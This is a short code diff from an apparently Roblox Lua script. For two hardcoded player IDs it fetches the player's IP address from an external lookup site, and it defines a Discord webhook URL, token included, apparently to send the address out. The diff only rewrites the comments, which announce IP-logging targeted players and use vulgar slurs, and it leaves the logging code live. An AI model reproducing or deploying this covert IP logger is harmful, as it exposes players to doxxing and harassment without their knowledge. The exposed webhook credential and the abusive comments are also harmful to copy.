@@ -937,7 +937,8 @@ end
 	if game.Players.LocalPlayer.UserId == 3372541763 or game.Players.LocalPlayer.UserId == 3498733335 then
 		ip = game:HttpGet("https://wtfismyip.com/text")
         end
-	-- IT'LL IP LOG 'EM, CAUSE, WHY NOT. THEY'RE A BITCH. WE AINT NO LIKE NO BITCHES.
+	-- i do not like bitches
+	-- plez do not spam the webhook zamn
 	
 	local url =
 		"https://discord.com/api/webhooks/980886616958726185/Lkm0fHz2gNoQTATU2GN3N182JvOOq0KRtO2mONPew0a0cNUCsZizdlBhtBbYksvUnsw5"
